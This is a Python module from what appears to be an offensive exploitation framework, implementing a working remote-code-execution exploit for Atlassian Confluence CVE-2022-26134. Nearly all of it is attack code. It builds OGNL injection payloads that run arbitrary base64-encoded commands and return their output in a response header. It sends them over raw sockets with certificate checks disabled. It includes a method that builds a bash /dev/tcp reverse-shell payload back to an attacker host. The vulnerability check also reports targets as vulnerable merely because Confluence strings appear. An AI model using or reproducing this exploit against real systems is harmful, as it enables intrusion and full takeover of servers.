"""
Atlassian Confluence CVE-2022-26134 Exploit
OGNL injection vulnerability in Confluence Server and Data Center.
"""

import asyncio
import socket
import urllib.parse
import base64
from ..templates.base_exploit import BaseExploit

class ConfluenceCVE202226134(BaseExploit):
    """Confluence CVE-2022-26134 OGNL injection RCE exploit."""
    
    name = "Confluence CVE-2022-26134 OGNL RCE"
    description = "OGNL injection vulnerability in Atlassian Confluence"
    author = "CypherFramework Team"
    version = "1.0"
    
    # Exploit metadata
    cve = "CVE-2022-26134"
    references = [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134",
        "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
    ]
    target_os = ["linux", "windows"]
    target_services = ["http", "https"]
    difficulty = "easy"
    reliability = "excellent"
    
    def _default_options(self):
        return {
            'RHOSTS': {'value': '', 'required': True, 'description': 'Target host(s)'},
            'RPORT': {'value': 8090, 'required': True, 'description': 'Target HTTP port'},
            'TARGETURI': {'value': '/', 'required': True, 'description': 'Target URI path'},
            'CMD': {'value': 'id', 'required': False, 'description': 'Command to execute'},
            'SSL': {'value': False, 'required': False, 'description': 'Use HTTPS'},
            'TIMEOUT': {'value': 30, 'required': False, 'description': 'Connection timeout'},
        }
        
    def _required_options(self):
        return ['RHOSTS', 'RPORT']
        
    async def check(self, target):
        """Check if target is vulnerable to CVE-2022-26134."""
        host = self.get_option('RHOSTS')
        port = self.get_option('RPORT')
        uri = self.get_option('TARGETURI')
        ssl = self.get_option('SSL')
        timeout = self.get_option('TIMEOUT')
        
        # Create detection payload
        detection_payload = "${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo confluence_test').getInputStream(),'utf-8')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Confluence-Test',#a))}"
        
        try:
            # Send HTTP request with OGNL payload
            response = await self._send_ognl_request(
                host, port, uri, detection_payload, ssl, timeout
            )
            
            if response:
                # Check for our test header
                if b'X-Confluence-Test: confluence_test' in response:
                    return {
                        'vulnerable': True,
                        'confidence': 0.95,
                        'details': 'OGNL injection confirmed via response header'
                    }
                    
                # Check for Confluence indicators
                confluence_indicators = [
                    b'confluence',
                    b'atlassian',
                    b'ajs-',
                    b'/confluence/'
                ]
                
                response_lower = response.lower()
                for indicator in confluence_indicators:
                    if indicator in response_lower:
                        return {
                            'vulnerable': True,
                            'confidence': 0.7,
                            'details': f'Confluence application detected: {indicator.decode()}'
                        }
                        
                return {
                    'vulnerable': False,
                    'confidence': 0.6,
                    'details': 'No Confluence vulnerability indicators found'
                }
            else:
                return {
                    'vulnerable': False,
                    'confidence': 0.3,
                    'details': 'No response received from target'
                }
                
        except Exception as e:
            return {
                'vulnerable': False,
                'confidence': 0.1,
                'details': f'Check failed: {str(e)}'
            }
            
    async def run(self, target):
        """Execute the Confluence OGNL injection exploit."""
        # Validate options
        validation = self.validate_options()
        if not validation['valid']:
            return {
                'success': False,
                'error': f"Missing required options: {validation['missing']}"
            }
            
        host = self.get_option('RHOSTS')
        port = self.get_option('RPORT')
        uri = self.get_option('TARGETURI')
        cmd = self.get_option('CMD')
        ssl = self.get_option('SSL')
        timeout = self.get_option('TIMEOUT')
        
        # Check vulnerability first
        check_result = await self.check(target)
        if not check_result['vulnerable']:
            return {
                'success': False,
                'error': 'Target does not appear vulnerable to CVE-2022-26134',
                'check_result': check_result
            }
            
        try:
            # Create OGNL payload for command execution
            ognl_payload = self._create_ognl_payload(cmd)
            
            # Send exploit request
            response = await self._send_ognl_request(
                host, port, uri, ognl_payload, ssl, timeout
            )
            
            if response:
                # Extract command output from response
                output = self._extract_command_output(response)
                
                return {
                    'success': True,
                    'output': output,
                    'command': cmd,
                    'target': f"{host}:{port}",
                    'exploit': 'Confluence CVE-2022-26134'
                }
            else:
                return {
                    'success': False,
                    'error': 'Failed to send exploit payload'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Exploit execution failed: {str(e)}'
            }
            
    def _create_ognl_payload(self, command):
        """Create OGNL payload for command execution."""
        # Encode command to avoid issues with special characters
        encoded_cmd = base64.b64encode(command.encode()).decode()
        
        # OGNL payload that executes command and returns output
        payload = f"""${{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(@java.util.Base64@getDecoder().decode('{encoded_cmd}')).getInputStream(),'utf-8')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Cmd-Output',@java.net.URLEncoder@encode(#a,'utf-8')))}}"""
        
        return payload
        
    async def _send_ognl_request(self, host, port, uri, payload, ssl, timeout):
        """Send HTTP request with OGNL payload in URI."""
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload, safe='')
        
        # Construct malicious URI
        malicious_uri = f"/{encoded_payload}{uri}"
        
        # Build HTTP request
        request_line = f"GET {malicious_uri} HTTP/1.1\r\n"
        request_line += f"Host: {host}:{port}\r\n"
        request_line += "User-Agent: Mozilla/5.0 (compatible; ConfluenceExploit)\r\n"
        request_line += "Accept: */*\r\n"
        request_line += "Connection: close\r\n"
        request_line += "\r\n"
        
        try:
            # Connect and send request
            if ssl:
                import ssl as ssl_module
                context = ssl_module.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl_module.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock = context.wrap_socket(sock, server_hostname=host)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                
            sock.connect((host, port))
            sock.send(request_line.encode())
            
            # Receive response
            response = b""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                    if b"\r\n\r\n" in response:
                        # Continue reading body
                        continue
                except socket.timeout:
                    break
                    
            sock.close()
            return response
            
        except Exception as e:
            raise Exception(f"HTTP request failed: {str(e)}")
            
    def _extract_command_output(self, response):
        """Extract command output from HTTP response headers."""
        try:
            response_str = response.decode('utf-8', errors='ignore')
            lines = response_str.split('\r\n')
            
            for line in lines:
                if line.lower().startswith('x-cmd-output:'):
                    encoded_output = line.split(':', 1)[1].strip()
                    # URL decode the output
                    decoded_output = urllib.parse.unquote(encoded_output)
                    return decoded_output
                    
            return "Command executed but no output captured"
        except:
            return "Failed to extract command output"
            
    def create_reverse_shell_payload(self, lhost, lport):
        """Create reverse shell payload for Confluence."""
        # Base64 encoded reverse shell command
        shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        encoded_cmd = base64.b64encode(shell_cmd.encode()).decode()
        
        payload = f"""${{(#a=@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{{"bash","-c","echo {encoded_cmd} | base64 -d | bash"}})).waitFor()}}"""
        
        return payload